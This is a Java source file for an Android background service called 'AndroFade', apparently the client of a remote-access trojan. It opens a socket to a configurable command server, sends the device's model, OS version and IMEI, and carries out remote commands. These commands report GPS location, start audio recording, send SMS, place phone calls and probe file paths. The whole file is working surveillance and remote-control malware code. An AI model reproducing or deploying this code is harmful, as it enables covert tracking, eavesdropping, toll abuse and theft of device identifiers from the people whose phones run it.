package my.app.client;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.Socket;

public class Client extends Service {
    
    private static final String TAG = "AndroFade";
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private String serverIP = "192.168.1.100";
    private int serverPort = 5000;
    private boolean isConnected = false;
    private Thread connectionThread;
    
    private PermissionManager permissionManager;
    private GPSListener gpsListener;
    private AudioStreamer audioStreamer;
    private ConnectionManager connectionManager;
    private NotificationManager notificationManager;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            serverIP = intent.getStringExtra("IP");
            if (serverIP == null) serverIP = "192.168.1.100";
            
            serverPort = intent.getIntExtra("PORT", 5000);
        }
        
        // Initialize managers
        permissionManager = new PermissionManager(this);
        gpsListener = new GPSListener(this);
        audioStreamer = new AudioStreamer(this);
        connectionManager = new ConnectionManager(this);
        notificationManager = new NotificationManager(this);
        
        // Start foreground service
        startForegroundService();
        
        // Connect to server
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                connectToServer();
            }
        });
        connectionThread.start();
        
        return START_STICKY;
    }

    private void startForegroundService() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "AndroFade")
                .setContentTitle("AndroFade")
                .setContentText("Service running...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW);
        
        startForeground(1, builder.build());
    }

    private void connectToServer() {
        try {
            socket = new Socket(serverIP, serverPort);
            in = new DataInputStream(socket.getInputStream());
            out = new DataOutputStream(socket.getOutputStream());
            isConnected = true;
            
            // Send device info
            sendDeviceInfo();
            
            // Listen for commands
            listenForCommands();
        } catch (Exception e) {
            android.util.Log.e(TAG, "Connection error: " + e.getMessage());
            isConnected = false;
        }
    }

    private void sendDeviceInfo() throws IOException {
        String deviceInfo = android.os.Build.DEVICE + "|" +
                android.os.Build.MODEL + "|" +
                android.os.Build.VERSION.RELEASE + "|" +
                getDeviceIMEI();
        
        out.writeUTF("INFO:" + deviceInfo);
        out.flush();
    }

    private void listenForCommands() throws IOException {
        while (isConnected) {
            String command = in.readUTF();
            processCommand(command);
        }
    }

    private void processCommand(String command) {
        try {
            if (command.startsWith("GPS")) {
                handleGPS();
            } else if (command.startsWith("AUDIO")) {
                handleAudio();
            } else if (command.startsWith("SMS:")) {
                handleSMS(command.substring(4));
            } else if (command.startsWith("CALL:")) {
                handleCall(command.substring(5));
            } else if (command.startsWith("CAMERA")) {
                handleCamera();
            } else if (command.startsWith("FILES:")) {
                handleFiles(command.substring(6));
            }
        } catch (Exception e) {
            android.util.Log.e(TAG, "Command error: " + e.getMessage());
        }
    }

    private void handleGPS() throws IOException {
        if (permissionManager.hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            gpsListener.startTracking();
            String location = gpsListener.getCurrentLocation();
            out.writeUTF("GPS:" + location);
            out.flush();
        }
    }

    private void handleAudio() throws IOException {
        if (permissionManager.hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            audioStreamer.startRecording();
            out.writeUTF("AUDIO:Recording started");
            out.flush();
        }
    }

    private void handleSMS(String data) throws IOException {
        try {
            String[] parts = data.split("\\|");
            if (parts.length == 2) {
                String phoneNumber = parts[0];
                String message = parts[1];
                
                android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
                
                out.writeUTF("SMS:Sent to " + phoneNumber);
                out.flush();
            }
        } catch (Exception e) {
            out.writeUTF("SMS:Error - " + e.getMessage());
            out.flush();
        }
    }

    private void handleCall(String phoneNumber) throws IOException {
        try {
            if (permissionManager.hasPermission(android.Manifest.permission.CALL_PHONE)) {
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(android.net.Uri.parse("tel:" + phoneNumber));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
                out.writeUTF("CALL:Calling " + phoneNumber);
                out.flush();
            }
        } catch (Exception e) {
            out.writeUTF("CALL:Error - " + e.getMessage());
            out.flush();
        }
    }

    private void handleCamera() throws IOException {
        out.writeUTF("CAMERA:Feature coming soon");
        out.flush();
    }

    private void handleFiles(String path) throws IOException {
        File file = new File(path);
        if (file.exists()) {
            out.writeUTF("FILES:" + file.getAbsolutePath());
            out.flush();
        } else {
            out.writeUTF("FILES:File not found");
            out.flush();
        }
    }

    private String getDeviceIMEI() {
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return tm.getImei();
            } else {
                return tm.getDeviceId();
            }
        } catch (Exception e) {
            return "Unknown";
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (socket != null) socket.close();
            isConnected = false;
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
